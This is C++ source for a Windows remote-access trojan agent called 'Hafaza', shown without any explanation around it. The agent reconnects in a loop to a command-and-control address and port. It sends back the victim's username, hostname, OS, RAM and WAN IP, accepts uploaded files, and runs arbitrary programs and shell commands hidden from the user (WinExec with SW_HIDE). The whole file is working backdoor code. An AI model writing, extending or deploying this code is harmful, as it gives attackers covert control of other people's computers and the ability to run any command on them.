//#include "pch.h"
#include "Hafaza.h"
//#pragma warning (disable : 4996)

void Hafaza::ExecuteFile(char* filename)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcess(filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
std::string Hafaza::GetSysinfo()
{
	std::string sysinfo;
	std::string RAM;
	OSVERSIONINFOEX osinfo;
	std::ostringstream rm;
	std::string returnme;
	MEMORYSTATUSEX memstatx;
	std::string filelocation;
	std::string agentPath;
	memstatx.dwLength = sizeof(memstatx);
	GlobalMemoryStatusEx(&memstatx);
	ZeroMemory(&osinfo, sizeof(OSVERSIONINFOEX));
	osinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((LPOSVERSIONINFO)&osinfo);
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	float ramsize = memstatx.ullTotalPhys / (1024 * 1024);
	rm << ramsize;
	RAM = rm.str();
	switch (osinfo.dwMajorVersion)
	{
	case 5:
		if (osinfo.dwMinorVersion == 0)
		{
			sysinfo = "Windows 2000 ";
		}
		else if (osinfo.dwMinorVersion == 1)
		{
			sysinfo = "Windows XP ";
		}
		else if (osinfo.dwMinorVersion == 2)
		{
			sysinfo = "Windows XP ";
		}
		break;
	case 6:
		if (osinfo.dwMinorVersion == 3)
		{ 
			sysinfo = "Windows 8.1 ";
		}
		else if (osinfo.dwMinorVersion == 2)
		{
			sysinfo = "Windows 8 ";
		}
		else if (osinfo.dwMinorVersion == 1)
		{
			sysinfo = "Windows 7 ";
		}
		else {
			sysinfo = "Windows Vista ";
		}
		break;
	case 10:
		sysinfo = "Windows 10 ";
		break;
	default:
		sysinfo = "Unknown OS ";
	}

	int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath == 0)
	{
		filelocation = "Unknown (Failed to get)";
	}
	else {
		filelocation = DIR;
	}

	returnme = "\n[+] Operating System : " + sysinfo + "\n[+] RAM : " + RAM + " mb" + "\n[+] User-PC : " + username +"/"+ hostname + "\n[+] Agent Location : " + filelocation;
	return returnme;	
}

void Hafaza::recvFile()
{
	int fsize;
	std::string response;
	std::ofstream recvfile(file_commands[1], std::ios::app | std::ios::binary);
	while ((fsize = recv(sockfd, filebuf, sizeof(filebuf), 0)) > 0)
	{
		recvfile.write(filebuf, sizeof(filebuf));
	}
	recvfile.close();
	response = "Saved " + std::string(file_commands[1]) + ".";
	respond(response.c_str());

}

void Hafaza::Wanip()
{
	HINTERNET hInternet, hFile;
	DWORD rSize;
	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hFile = InternetOpenUrl(hInternet, _T("http://bot.whatismyipaddress.com/"), NULL, 0, INTERNET_FLAG_RELOAD, 0);
	InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
	wanip[rSize] = '\0';

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet); 
}

// Split string using C Method. I'm using it. Do whatever you want!
void Hafaza::strsplit(char src[500], char* dest[5]) {
	int i = 0;
	char *p = strtok(src, "=");
	while (p != NULL)
	{
		dest[i++] = p;
		p = strtok(NULL, "=");
	}
}

void Hafaza::ConnectionManage()
{
	while (connected)
	{
		memset(recvbuf, '\0', BUFFER);
		int resc = recv(sockfd, recvbuf, BUFFER, 0);
		std::string command(recvbuf);
		if (command == "test\n")
		{
			respond("Connection is ok!");
		}
		else if (command == "sysinfo\n")
		{
			respond(Hafaza::GetSysinfo().c_str());
		}
		else if (command.find("recvthis") != std::string::npos)
		{
			memset(file_commands, '\0', 500);
			memset(filebuf, '\0', BUFFER);
			strsplit(recvbuf, file_commands);
			std::cout << "Receiving File " << file_commands[1] << std::endl;
			recvFile();
			std::cout << "Got File." << std::endl;
			
		}
		else if (command == "wanip\n") {
			respond((const char*)wanip);
		}
		else if (command.find("msgbox") != std::string::npos)
		{
			memset(msgbox, '\0', 5);
			strsplit(recvbuf, msgbox);
			respond("Displaying Messagebox.");
			MessageBoxA(NULL, msgbox[1], msgbox[2], MB_ICONINFORMATION);
			respond("User Closed Messagebox.");
		}
		// exec [ Hidden Execution of an Application ]
		else if (command.find("exec") != std::string::npos) {
			memset(fcommands, '\0', 5);
			strsplit(recvbuf, fcommands);
			ExecuteFile(fcommands[1]);
			respond("File Executed.");
		}
		else if (command == "hostname")
		{
			respond(hostname);
		}
		else if (command == "username")
		{
			respond(username);
		}
		else if (command.find("cmd") != std::string::npos)
		{
			memset(cmd, '\0', 5);
			strsplit(recvbuf, cmd);
			WinExec(cmd[1], SW_HIDE);
			respond("Command Executed.");
		}
		else {
			/*
			Unidentified Command 
			No response - 
			*/
		}
	}
}

void Hafaza::respond(const char * data) {
	int totalsent = 0;
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

void Hafaza::C2Connect()
{
	WSADATA wsa;
	DWORD timeout = 1000;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { std::cout << "WSA Startup failed : " << WSAGetLastError() << std::endl; exit(1); };
	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
	{
		std::cout << "Failed to Create Socket : " << WSAGetLastError() << std::endl;
		exit(1);
	}
	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
	
	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_port = htons(3567);
	server.sin_family = AF_INET;

	do {
		if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
			std::cout << "Connection failed : " << WSAGetLastError() << std::endl;
			Sleep(1000);
		}
		else {
			connected = true;
			std::cout << "Connection Established." << std::endl;
		}
	} while (!connected); // Not Connected, While not connected.
	
	ConnectionManage();
}
